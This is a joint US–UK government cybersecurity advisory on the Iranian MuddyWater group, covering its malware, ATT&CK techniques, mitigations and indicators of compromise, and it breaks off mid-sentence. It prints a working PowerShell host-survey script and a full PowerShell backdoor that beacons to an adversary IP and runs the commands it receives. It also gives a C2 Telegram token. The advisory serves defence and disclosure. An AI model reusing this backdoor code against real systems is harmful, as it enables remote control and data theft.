{
  "markdown": " \n  \n \n \n \n \n   \n \nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your loc al \nFBI field office at www.fbi.gov/contact -us/field -offices , or the FBIs 24/7 Cyber Watch (CyWatch) at (855) 292 -3937 or by \nemail at CyWatch@fbi.gov . When available, please include  the following information regarding the incident: date, time, and \nlocation of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of t he \nsubmitting company or organization; and a designated point of  contact. To request incident response resources or technical \nassistance related to these threats, contact CISA at CISAServiceDesk@cisa.dhs.gov . For NSA client requirements or \ngeneral cybersecurity inquir ies, contact the Cybersecurity Requirements Center at Cybersecurity_Requests@nsa.gov . \nUnited Kingdom organizations should report a significant cyber security incident: ncsc.gov.uk/report -an-incident  (monitored \n24 hours) or for urgent assistance call 03000 200 973.  \nThis document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries \nminimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to \nstandard copyright rules, TLP:WHITE information may be distributed without restriction.  \nFor more information on the Traffic Light Prot ocol, see www.cisa.gov/tlp . \nTLP: WHITE    Product ID: A A22-055A  \n February 24, 2022  TLP:WHITE  \n Co-Authored by:  \nIranian Government -Sponsored Actors Conduct  \nCyber Operations Against Global Government \nand Commercial Networks   \nNote:  this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) \nframework, version 10. See the  ATT&CK for Enterprise  for all referenced threat actor tactics and techniques.  \nSUMMARY  \nThe Federal Bureau of Investigation (FBI) , the Cybersecurity \nand Infrastructure Security Agency (CISA) , the U.S. Cyber \nCommand Cyber National Mission Force (CNMF) , and the \nUnited Kingdoms Nation al Cyber Security Centre (NCSC -\nUK) have observed a  group of Iranian government -sponsored  \nadvanced persistent threat (APT) actors , known as \nMuddyWate r, conducting  cyber espionage and other \nmalicious cyber  operations  targeting a range of government \nand private -sector  organizations  across sectors including  \ntelecommunications, defense, local government, and oil and \nnatural gas in Asia, Africa, Europe, and North America . \nNote: MuddyWater is also known as Earth Vetala, \nMERCURY, Static Kitten, Seedworm, and TEMP.Zagros . \nMuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security \n(MOIS) .[1] This APT group has conducted broad cyber campaigns in support of  MOIS  objectives \nsince approximately 2018 . MuddyWater actors are positioned both to provide stolen data and \naccesses to the Iranian government and to share these  with other malicious cyber actors.  Actions to Take Today to Protect \nAgainst Malicious Activity  \n Search for indicators of \ncompromise.  \n Use antivirus software.  \n Patch  all systems.  \n Prioritize patching known \nexploited vulnerabilities . \n Train users to recognize and \nreport phishing attempts .  \n Use multi -factor authentication . \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 2 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    MuddyWater actors  are known to exploit publicly reported vulnerabilities  and use open -source tools  \nand strategies to gain access to sensitive data on victims systems  and deploy ransomware . These \nactors also maintain persistence on victim networks via tactics such as  side-loading dynamic link \nlibraries ( DLLs )to trick legitimate programs into running malware and obfuscating PowerShell \nscripts to hide command and control (C2) functions.  FBI, CISA, CNMF, and NCSC -UK have observed \nMuddyWater actors recent ly using various malware variants of PowGoop, Small Sieve, Canopy  \n(also known as Starwhale ), Mori, and POWERSTATS along with  other tools as part of their \nmalicious activity.  \nThis advisory provides observed tactics , techniques , and procedures (TTPs); malware; and indicators \nof compromise (IOCs) associated with this Iranian government -sponsored APT activity  to aid \norganizations  in the identification of malicious activity against sensitive networks.  \nFBI, CISA, CNMF, NCSC -UK, and the N ational Security Agency (NSA)  recommend o rganizations \napply the mitigations in this advisory  and review the following resources  for additional information . \nNote:  also see the Additional Resources section.  \n Malware Analysis Report   MAR -10369127.r1.v1 : MuddyWater  \n IOCs   AA22 -055A.stix and MAR -10369127.r1.v1 .stix \n CISA's webpage  Iran Cyber Threat Overview and Advisories   \n NCSC -UK MAR: Small Sieve  \n CNMF's press release  Iranian intel cyber suite of malware uses open source tools  \n \nTECHNICAL DETAILS  \nFBI, CISA, CNMF, and NCSC -UK have observed the Iranian government -sponsored MuddyWater \nAPT group  employ ing spearphishing, exploiting publicly known vulnerabilities , and leverag ing multiple \nopen -source  tools  to gain access to sensitive government and commercial networks.  \nAs part of its spearphishing campaign, MuddyWater  attempt s to coax the ir targeted victim into \ndownloading ZIP files , containing either an Excel file with a malicious macro that communicates with \nthe actor s C2 server or a PDF file that drops a malicious file to the victims network  [T1566.001 , \nT1204.002 ]. MuddyWater actors also use techniques such as side -loading DLLs [T1574. 002] to trick \nlegitimate  programs into running malware and obfuscating PowerShell scripts [T1059.001 ] to hide C2 \nfunctions  [T1027 ] (see the PowGoop section for more information) .  \nAdditionally, the group uses multiple malware sets including PowGoop, Small Sieve, \nCanopy/Starwhale, Mori, and POWERSTATS for loading malware, backdoor access, persistence  \n[TA0003 ], and exfiltration  [TA0010 ]. See below for descriptions of s ome of these  malware sets , \nincluding newer tools or variants to the groups suite.  Additionally, s ee Malware Analysis Report MAR -\n10369127.r1.v1 : MuddyWater  for further details.  \nPowGoop  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 3 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    MuddyWater actors use new variants of PowGoop malware as their main loader in malicious \noperations ; it consists of  a DLL loader and a PowerShell -based downloader. The malicious file \nimpersonates a legitimate file that is signed as a Google Update executable file.  \nAccording to sample s of PowGoop analyzed by CISA  and CNMF , PowGoop consist s of three \ncomponents:  \n A DLL file renamed as a  legitimate filename , Goopdate.dll , to enable the DLL side -loading \ntechnique  [T1574.002 ]. The DLL file is contained within an executable , GoogleUpdate.exe .  \n A PowerShell script, obfuscated as a .dat file , goopdate.dat , used to decrypt and run  a \nsecond obfuscated PowerShell script , config.txt  [T1059.001 ]. \n config.txt , an encoded , obfuscated  PowerShell script  containing a beacon to a hardcoded \nIP address.  \nThese components retrieve encrypted commands from a C2 server. The DLL file hides \ncomm unication s with MuddyWater  C2 servers by executing with  the Google Update service.   \nSmall Sieve  \nAccording to a sample analyzed by NCSC -UK, Small Sieve is a simple Python [ T1059.006 ] backdoor \ndistributed using a Nullsoft Scriptable Install System (NSIS) installer , gram_app.exe . The NSIS \ninstall s the Python backdoor, index.exe , and add s it as a registry run key [ T1547.001 ], enabling \npersi stence [ TA0003 ].  \nMuddyWater disguise s malicious executables and use s filenames and Registry key names \nassociated with Microsoft's Windows Defender  to avoid detection during casual inspe ction . The APT \ngroup has also used variations of Microsoft ( e.g., \"Microsift \") and Outlook in its filenames  associated \nwith Small Sieve  [T1036.005 ]. \nSmall Sieve provides basic functionality required to maintain and expand a foothold in victim \ninfrastructure  and avoid detection [ TA0005 ] by using custom string and traffic obfuscation schemes \ntogether with the Te legram Bot application programming interface (API). Specifically, Small Sieves \nbeacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure \n(HTTP S) [T1071.001 ], and the tasking and beaconing data is obfuscated through a hex byte \nswapping encoding scheme combined with an obfuscated Base64 function [ T1027 ], T1132.002 ]. \nNote:  cybersecurity agencies  in the United Kingdom and the United States  attribute Small Sieve  to \nMuddyWater with high confidence.   \nSee Appendix B for further analysis of Small Sieve malware.  \nCanopy  \nMuddyWater  also uses Canopy /Starwhale  malware,  likely distributed via spearphishing emails with \ntargeted attachments  [T1566.001 ]. According to two Canopy/Starwha le samples analyzed  by CISA, \nCanopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note:  the \ncybersecurity agencies of the United Kingdom and the United States attribute th ese malware samples \nto MuddyWater with high confidence.   \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 4 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    In the samples  CISA analyzed, a malicious Excel file, Cooperation terms.xls , contain ed macros \nwritten in Visual Basic for Applications (VBA) and two encoded Windows Script Files . When the victim \nopens the Excel file, they receive a  prompt to enable macros  [T1204.002 ]. Once this occurs, t he \nmacros are executed , decod ing and install ing the two  embedded Windows Script Files. \nThe first .wsf is installed in the current user startup folder [T1547.001 ] for persistence. The file \ncontains  hexadecimal (hex) -encoded strings that have been reshuffled  [T1027 ]. The file executes a \ncommand to run the second .wsf.  \nThe second .wsf also contains hex -encoded strings that have been reshuffled. This file collects \n[TA0035 ] the victim systems IP  address, computer name, and username  [T1005 ]. The collected data \nis then hex -encoded and sent to an adversary -controlled IP address , http[:]88.119.170 [.]124, \nvia an HTTP POST request [T1041 ]. \nMori  \nMuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate \nwith the groups C2 infrastructure  [T1572 ].  \nAccording to one sample analyzed by CISA,  FML.dll , Mori uses a DLL written in C++ that is \nexecuted with regsvr32.exe  with export  DllRegisterServer ; this DLL appears to be a component \nto another program. FML.dll  contains approximately 200MB of junk data [T1001.001 ] in a resource \ndirectory 205, number 105. Upon execution, FML.dll  creates a mutex , 0x50504060 , and performs \nthe following task s: \n Delet es the file FILENAME.old  and delet es file by registry value. The filename is the DLL file with \na .old  extension.  \n Resolves networking APIs from strings that are ADD -encrypted with the key 0x05 . \n Uses Base64 and Java Script Object Notation (JSON ) base d on certain key values passed to the \nJSON library functions. It appears likely that JSON is  used to serialize C2 commands and/or their \nresults.  \n Communicates using  HTTP over either IPv4 or IPv6, depending on the value of an unidentified \nflag, for C2  [T1071.001 ]. \n Read s and/or writ es data from the following Registry Keys, HKLM\\Software \\NFC\\IPA and \nHKLM\\Software \\NFC\\(Default ). \nPOWERSTATS  \nThis group is also known to use  the POWERSTAT S backdoor,  which runs PowerShell scripts to \nmaintain persistent access to the victim systems  [T1059.001 ].  \nCNMF has posted s amples further detailing the  different parts of MuddyWaters  new suite of tools  \nalong with JavaScript files used to establish connections back to malicious infrastructure to the \nmalware aggregation tool and repository,  Virus Total . Network op erators who identify multiple \ninstances of the tools on the same network  should investigate further as this may indicate the \npresence of an Iranian malicious cyber actor . \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 5 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    MuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted \noperations. FBI, CISA, CNMF,  and NCSC -UK have observed this APT group  recently exploiting the \nMicrosoft Netlogon elevation of privilege  vulnerability ( CVE-2020 -1472 ) and the Microsoft Exchange \nmemory corruption vulnerability ( CVE-2020 -0688 ). See CISAs Known Exploit ed Vulnerabilities \nCatalog  for additional vulnerabilities with known  exploit s and  joint Cybersecurity Advisory:  Iranian \nGovernment -Sponsored APT Cyber Actors Exploiting Microsoft Exchange an d Fortinet Vulnerabilities  \nfor additional Iranian  APT group -specific  vulnerability exploits.  \nSurvey Script  \nThe following script is an example of a survey script used by MuddyWater to enumerate information \nabout victim computers. It queries the  Windows Management Instrumentation  (WMI) service to obtain \ninformation about the compromised machine to generate a string, with these fields separated by a \ndelimiter (e .g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant \nand se nt to an adversary -controlled IP address.  \n$O = Get -WmiObject Win32_OperatingSystem;$S = $O.Name;$S += \";;\";$ips = \"\";Get -\nWmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | % {$ips = \n$ips + \", \" + $_.IPAddress[0]};$S += $ips.substring(1) ;$S += \";;\";$S += \n$O.OSArchitecture;$S += \";;\";$S += \n[System.Net.DNS]::GetHostByName('').HostName;$S += \";;\";$S += ((Get -WmiObject \nWin32_ComputerSystem).Domain);$S += \";;\";$S += $env:UserName;$S += \n\";;\";$AntiVirusProducts = Get -WmiObject -Namespace \"root \\SecurityCenter2\" -Class \nAntiVirusProduct  -ComputerName $env:computername;$resAnti = \n@();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti += \n$AntiVirusProduct.displayName};$S += $resAnti;echo $S;  \nNewly Identified Power Shell Backdoor  \nThe new ly ident ified Power Shell backdoor used by MuddyWater below uses a single -byte Exclusive -\nOR (XOR) to encrypt communications with the key 0x02 to adversary -controlled infrastructure. The \nscript is lightweight in functionality and uses the InvokeScript method to exec ute responses received \nfrom the adversary . \nfunction encode($txt,$key){$enByte = \n[Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ; \n$i++){$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt = \n[Convert]::ToBase64String($enByte);return $encode txt;}function \ndecode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i \n-lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt = \n[System.Text.Encoding]::UTF8.GetString($enByte);return \n$dtxt;}$global:tt=20;while($true) {try{$w = \n[System.Net.HttpWebRequest]::Create('http [:]//95.181.161 [.]49:80/index.php?id=<vi\nctim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(New -\nObject \nSystem.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.L\n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 6 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    ength -gt 0){$res=[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode \n$r 2));$wr = \n[System.Net.HttpWebRequest]::Create('http [:]//95.181.161 [.]49:80/index.php?id=<vi\nctim identifier>');$wr.proxy = \n[Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Ad d('cookie',(encode $res \n2));$wr.GetResponse().GetResponseStream();}}catch {}Start -Sleep -Seconds \n$global:tt;}  \nMITRE ATT&CK TECHNIQ UES \nMuddyWater  uses the ATT&CK techniques listed in table 1.  \nTable 1: MuddyWater ATT&CK Techniques  [2] \nTechnique Title  ID Use \nReconnaissance  \nGather Victim Identity \nInformation:  Email Addresses  T1589.002  MuddyWater  has specifically targeted government agency \nemployees with spearphishing emails.  \nResource Development  \nAcquire Infrastructure:  Web \nServices  T1583.006  MuddyWater  has used file sharing services including \nOneHub to distribute tools.  \nObtain Capabilities:  Tool T1588.002  MuddyWater  has made use of legitimate \ntools  ConnectWise  and RemoteUtilities  for access to target \nenvironments.  \nInitial Access  \nPhishing:  Spearphishing \nAttachment  T1566.001  MuddyWater  has compromised third parties and used \ncompromised accounts to send spearphishing emails with \ntargeted attachments.  \nPhishing:  Spearphishing Link  T1566.002  MuddyWater  has sent targeted spearphishing emails with \nmalicious links.  \nExecution  \nWindows Management \nInstrumentation  T1047  MuddyWater  has used malware that leveraged Windows \nManagement Instrumentation  for execution and querying \nhost information.  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 7 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Command and Scripting \nInterpreter : PowerShell  T1059.001  MuddyWater  has used PowerShell for execution.  \nCommand and Scripting \nInterpreter : Windows \nCommand Shell  1059.003  Muddy Water  has used a custom tool for creating reverse \nshells.  \nCommand and Scripting \nInterpreter : Visual Basic  T1059.005  MuddyWater  has used V irtual Basic Script (VBS) files to \nexecute its  POWERSTATS  payload, as well as macros.  \nCommand and Scripting \nInterpreter : Python  T1059.006  MuddyWater  has used developed tools in Python \nincluding  Out1 .  \nCommand and Scripting \nInterpreter:  JavaScript  T1059.007  MuddyWater  has used JavaScript files to execute \nits POWERSTATS  payload.  \nExploitation for Client \nExecution  T1203  MuddyWater  has exploited the Office vulnerability CVE -\n2017 -0199 for execution.  \nUser Execution:  Malicious Link  T1204.001  MuddyWater  has distributed URLs in phishing emails that \nlink to lure documents.  \nUser Execution:  Malicious File  T1204.002  MuddyWater  has attempted to get users to enable macros \nand launch malicious Microsoft Word documents delivered \nvia spearphishing emails.  \nInter-Process \nCommunication:  Compon ent \nObject Model  T1559.001  MuddyWater  has used malware that has the capability to \nexecute malicious code via COM, DCOM, and Outlook.  \nInter-Process \nCommunication:  Dynamic \nData Excha nge T1559.002  MuddyWater  has used malware that can execute \nPowerShell scripts via Dynamic Data Exchange . \nPersistence  \nScheduled \nTask/Job:  Scheduled Task  T1053.005  MuddyWater  has used scheduled tasks to establish \npersistence.  \nOffice Application \nStartup:  Office Template \nMacros  T1137.001  MuddyWater  has used a Word Template, Normal.dotm , \nfor persistence.  \nBoot or Logon Autostart \nExecution : Registry Run  Keys \n/ Startup Folder  T1547.001  MuddyWater has added Registry Run key \nKCU\\Software \\Microsoft \\Windows\\CurrentVersion \\R\nun\\SystemTextEncoding  to establish persistence.   \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 8 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Privilege Escalat ion \nAbuse Elevation Control \nMechanism: Bypass User \nAccount Control  T1548.002  MuddyWater  uses various techniques to bypass user \naccount control . \nCredentials from Password \nStores  T1555  MuddyWater  has performed credential dumping \nwith LaZagne  and other tools, including by dumping \npasswords saved in victim email.  \nCredentials from Web \nBrowsers  T1555.003  MuddyWater  has run tools including Browser64 to steal \npasswords saved in victim web browsers.  \nDefense Evasion  \nObfuscated Files or \nInformation  T1027  MuddyWater  has used Daniel Bohannons Invoke -\nObfuscation framework and obfuscated PowerShell \nscripts.  The group has also used other obfuscation \nmethods, including Base64 obfuscation  of VBScripts and \nPowerShell commands.  \nSteganography  T1027.003  MuddyWater  has stored obfuscated JavaScript code in an \nimage file named temp.jpg . \nCompile After Delivery  T1027.004  MuddyWater  has used the .NET  csc.exe  tool to compile \nexecutables from downloaded C# code.  \nMasquerading:  Match \nLegitimate Name or Location  T1036.005  MuddyWater  has disguised malicious executables and \nused filenames and Registry key names associated with \nWindows Defender.  E.g., Small Sieve uses variations of \nMicrosoft (Mi crosift) and Outlook in its filenames to attempt \nto avoid detection during casual inspection.  \nDeobfuscate/Decode Files or \nInformation  T1140  MuddyWater  decoded Base64 -encoded PowerShell  \ncommands using a VBS file.  \nSigned Binary Proxy \nExecution:  CMSTP  T1218.003  MuddyWater  has used CMSTP.exe  and a malicious .INF  \nfile to execute its  POWERSTATS  payload.  \nSigned Binary  Proxy \nExecution:  Mshta  T1218.005  MuddyWater  has used mshta.exe  to execute \nits POWERSTATS  payload and to pass a PowerShell one -\nliner for execution.  \nSigned Binary Proxy \nExecution:  Rundll32  T1218.011  MuddyWater  has used malware that leveraged \nrundll32.exe  in a Registry Run key to execute a .dll . \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 9 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Execution Guardrails  T1480 The Small Sieve payload used by MuddyWater will only \nexecute correctly if the word Platypus is passed to it on \nthe command line.  \nImpair Defenses:  Disable or \nModify Tools  T1562.001  MuddyWater  can disable the system's local proxy settings.  \nCredential Access  \nOS Credential \nDumping:  LSASS Memory  T1003.001  MuddyWater  has performed credential dumping \nwith Mimikatz  and procdump64.exe . \nOS Credential Dumping:  LSA \nSecrets  T1003.004  MuddyWater  has performed credential dumping \nwith LaZagne.  \nOS Credential \nDumping:  Cached Domain \nCredentials  T1003.005  MuddyWater  has performed credential dumping \nwith LaZagne.  \nUnsecured \nCredentials:  Credentials In \nFiles  T1552.001  MuddyWater  has run a tool that steals passwords saved in \nvictim email.  \nDiscovery  \nSystem Network Configuration \nDiscovery  T1016  MuddyWater  has used malware to collect the victims IP \naddress and domain name.  \nSystem Owner/User Discovery  T1033  MuddyWater  has used malware that can collect the \nvictims username.  \nSystem Network Connections \nDiscovery  T1049  MuddyWater  has used a PowerShell backdoor to check for \nSkype connections on the target machine.  \nProcess Discovery  T1057  \n MuddyWater  has used malware to obtain a list of running \nprocesses on the system.  \nSystem Information Discovery  T1082  MuddyWater  has used malware that can collect the \nvictims OS version and machine name.  \nFile and Directory Discovery  T1083  MuddyWater  has used malware that checked if the \nProgramData folder had folders or files with the keywords \n\"Kasp er,\" \"Panda,\" or \"ESET.\"  \nAccount Discovery:  Domain \nAccount  T1087.002  MuddyWater  has used  cmd.exe  net user/domain  to \nenumerate  domain users.  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 10 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Software Discovery  T1518  MuddyWater  has used a PowerShell backdoor to check for \nSkype connectivity on the target machine.  \nSecurity Software Discovery  T1518.001  MuddyWater  has used malware to check running \nprocesses against a hard -coded list of security tools often \nused by malware researchers.  \nCollection  \nScreen Capture  T1113  MuddyWater  has used malware that can capture \nscreenshots of the victims machine.  \nArchive Collected \nData : Archive via Util ity T1560.001   MuddyWater  has used the native Windows cabinet \ncreation tool, makecab.exe , likely to compress stolen data \nto be uploaded.  \nCommand and Control  \nApplication Layer \nProtocol : Web Protocols  T1071.001  MuddyWater  has used HTTP for C2 communications.  e.g., \nSmall Sieve beacons and tasking are performed using the \nTelegram API over HTTPS.  \nProxy:  External Proxy  T1090.002  \n MuddyWater  has controlled  POWERSTATS  from behind a \nproxy network to obfuscate the C2  location.   \nMuddyWater  has used a series of compromised websites \nthat victims connected to randomly to relay information to \nC2. \nWeb Service:  Bidirectional \nCommunication  T1102.002  MuddyWater  has used web services including OneHub to \ndistribute remote access tools.  \nMulti -Stage Channels  T1104  MuddyWater  has used one C2 to obtain enumeration \nscripts and monitor web logs, but a different C2 to send \ndata back.  \nIngress Tool Transfer  T1105  MuddyWater  has used malware that can upload additional \nfiles to the victims machine.  \nData Encoding:  Standard \nEncoding  T1132.001  MuddyWater  has used tools to encode C2 \ncommunications including Base64 encoding.  \nData Encoding: Non-Standard \nEncoding  T1132.002  MuddyWater uses tools  such as Small Sieve , which \nemploy s a custom hex byte swapping encoding scheme to \nobfuscate tasking traffic.  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 11 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Remote Access Software  T1219  \n MuddyWater  has used a legitimate application, \nScreenConnect, to manage systems remotely and move \nlaterally.  \nExfiltration  \nExfiltration Over C2 Channel  T1041  MuddyWater  has used C2 infrastructure to receive \nexfiltrated data.  \nMITIGATION S \nProtective Controls and Architecture  \n Deploy application control software to limit the applications and executable code that can \nbe run by users.  Email attachments and files downloaded via links in emails often contain \nexecutable code.  \nIdentity and Access Management  \n Use multifactor authentication where possible , particularly for webmail, virtual private \nnetworks, and accounts that access critical systems.   \n Limit the use of administrator privileges.  Users who browse the internet, use email, and \nexecute code with administra tor privileges make for excellent spearphishing targets because their \nsystem once infected enables attackers to move laterally across the network, gain additional \naccesses, and access highly sensitive information.  \nPhishing Protection  \n Enable  antivirus and anti-malware software and update signature definitions in a timely \nmanner.  Well-maintained antivirus software may prevent use of commonly deployed attacker \ntools that are delivered via spearphishing.  \n Be suspicious of unsolicited contact via email or socia l media from any individual you do \nnot know personally.  Do not click on hyperlinks  or open attachments  in these comm unications . \n Consider adding an email banner to emails received from outside your organization  and \ndisabling hyperlinks in received emails . \n Train users through awareness and simulations to recognize and report phishing and \nsocial engineering attempts.  Identify and suspend access of user  account s exhibiting unusual \nactivity.  \n Adopt threat reputation services at the network device, operating syst em, application, and \nemail service levels. Reputation services can be used to detect or prevent low -reputation email \naddresses, files, URLs, and IP addresses used in spearphishing attacks.  \nVulnerability and Configuration Management  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 12 of 18  |  Product ID : AA22 -055A \nTLP: WHITE     Install updates/patch o perating systems, software, and firmware as soon as \nupdates/patches are released.  Prioritize patching known exploited vulnerabilities . \nADDITIONAL RESOURCES  \n For more information on  Iranian government -sponsored malicious cyber activity, see  CISA's \nwebpage  Iran Cyber Threat Overview and Advisories  and CNMF's press release  Iranian \nintel cyber suite of malware uses open source tools .  \n For information and resources on protecting against and responding to ransomware, refer \nto StopRansomware.gov , a centralized, whole -of-government webpage providing ransomware \nresources and alerts.  \n The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the \nUnited Kingdom, and the United States:  Technical Approaches to Uncovering and \nRemediating Malicious Activity  provides additional guidance when hunting or investigating a \nnetwork and common mistakes to avoid in incident handling.  \n CISA offers a range of no -cost cyber hygiene services  to help critical infrastructure \norganizations assess, identify, and reduce their exposure to threats, including ransomware. By \nrequesting these services, organizations of any size could find ways to reduce their risk a nd \nmitigate attack vectors.  \n The U.S. Department of States Rewards for Justice (RFJ) program offers a reward of up to \n$10 million for reports of foreign government malicious activity against U.S. critical \ninfrastructure. See the  RFJ website for more information and how to report information \nsecurely.  \nREFERENCES  \n[1] CNMF Article : Iranian Intel Cyber Suite of Malware Uses Open Source Tools  \n[2] MITRE ATT&CK: MuddyWater  \nCAVEATS  \nThe information you have accessed or received is being provided as is for informationa l purposes \nonly. The FBI, CISA, CNMF, and NSA do not endorse any commercial product or service, including \nany subjects of analysis. Any reference to specific commercial products, processes, or services by \nservice mark, trademark, manufacturer, or otherwise , does not constitute or imply their endorsement, \nrecommendation, or favoring by the FBI, CISA, CNMF, or NSA.  \nPURPOSE  \nThis document was developed by the FBI, CISA, CNMF, NCSC -UK, and NSA in furtherance of their \nrespective cybersecurity missions, including their responsibilities to develop and issue cybersecurity \nspecifications and mitigations. This information may be shared broadly to reach all appropriate \nstakeholders. The United States NSA agrees with this attribution and the details provided in this \nreport.  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 13 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    APPENDIX A : IOCS  \nThe following IP addresses are associated with MuddyWater activity:  \n5.199.133[.]149  \n45.142.213[.]17   \n45.142.212[.]61  \n45.153.231[.]104  \n46.166.129[.]159  \n80.85.158[.]49  \n87.236.212[.]22  \n88.119.170[.]124  \n88.119.171[.]213  \n89.163.252[. ]232 \n95.181.161[.]49  \n95.181.161[.]50  \n164.132.237[.]65  \n185.25.51[.]108  \n185.45.192[.]228  \n185.117.75[.]34  \n185.118.164[.]21  \n185.141.27[.]143  \n185.141.27[.]248  \n185.183.96[.]7  \n185.183.96[.]44  \n192.210.191[.]188  \n192.210.226[.]128  \n  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 14 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    APPENDIX B: SMALL SIEVE  \nNote:  the information contained in this appendix is from NCSC -UK analysis of a Small Sieve sample.  \nMetadata  \nTable 2: Gram_app.exe Metadata  \nFilename  gram_app.exe  \nDescription  NSIS installer that installs and runs the index.exe backdoor and adds a \npersistence registry key  \nSize 16999598 bytes  \nMD5  15fa3b32539d7453a9a85958b77d4c95  \nSHA -1 11d594f3b3cf8525682f6214acb7b7782056d282  \nSHA -256 b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1f c9054  \nCompile Time  2021 -09-25 21:57:46 UTC  \n \nTable 3: Index.exe Metadata  \nFilename  index.exe  \nDescription  The final PyInstaller -bundled Python 3.9 backdoor  \nSize 17263089 bytes  \nMD5  5763530f25ed0ec08fb26a30c04009f1  \nSHA -1 2a6ddf89a8366a262b56a251b00aafaed5321992  \nSHA -256 bf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37\nd3a2  \nCompile Time  2021 -08-01 04:39:46 UTC  \n \nFunctionality  \nInstallation  \nSmall Sieve is distributed as a large (16MB) NSIS installer named gram_app.exe , which does not \nappear to masquerade as a legitimate application. Once executed, the backdoor binary index.exe  is \ninstalled in the users AppData/Roaming  directory and is added as a Run key in the registry to \nenabled persistence after reboot.  \nThe installer then executes the backdoor with the Platypus  argument  [T1480 ], which is also present \nin the registry persistence key: \nHKCU\\Software \\Microsoft \\Windows\\CurrentVersion \\Run\\OutlookMicrosift .  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 15 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Configuration  \nThe backdoor attempts to restore previously initiali zed session data from \n%LocalAppData% \\MicrosoftWindowsOutlookDataPlus.txt .  \nIf this file does not exist, then it uses the hardcoded values  listed in table 4 : \nTable 4: Credentials and Session Values  \nField  Value  Description  \nChat ID  2090761833  This is the  Telegram Channel ID that \nbeacons are sent to, and , from which , \ntasking requests are received. Tasking \nrequests are dropped if they do not \ncome from this channel. This value \ncannot be changed.  \nBot ID  Random value between \n10,000,000 and \n90,000,000  This is a  bot identifier generated at \nstartup that is sent to the C2 in the \ninitial beacon. Commands must be \nprefixed with /com[Bot ID]  in order \nto be processed by the malware . \nTelegram Token  2003026094: \nAAGoitvpcx3SFZ2_6YzIs4\nLa_kyDF1PbXrY  This is t he initial token used to \nauthenticate each message to the \nTelegram Bot API . \nTasking  \nSmall Sieve beacons  via the Telegram Bot API, sending the configured Bot ID, the currently logged -in \nuser, and the hosts IP address, as described in the Communications (Beacon format) section below . \nIt then waits for taskin g as a Telegram bot using the python -telegram -bot module.  \nTwo task formats are supported:  \n /start   no argument is passed; this causes the beacon information to be repeated.  \n /com[BotID] [command]   for issuing commands passed in the argument.  \nThe following commands are supported by the second of these formats , as described in table 5 : Com  \nTable 5: Supported Commands  \nCommand  Description  \ndelete  This command c auses the backdoor to exit ; it does \nnot remove persistence.  \ndownload urlfilename  The URL will be fetched and saved to the provided \nfilename  using the Python urllib module \nurlretrieve  function.  \n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 16 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    change token newtoken  The backdoor will reconnect to the Telegram Bot \nAPI using the provided token newtoken . This \nupdated token will be stored in the encoded \nMicrosoftWindowsOutlookDataPlus.txt  file.  \ndisconnect  The original connection to Telegram is terminated. \nIt is likely used after a change token  command is \nissued.  \nAny commands other than those detailed  in table 5 are executed directly by passing them to cmd.exe \n/c, and the output is returned as a reply.  \nDefen se Evasion  \nAnti-Sandbox  \n \nFigure 1: Execution Guardrail  \nThreat actors may be attempting to thwart simple analysis by not  passing  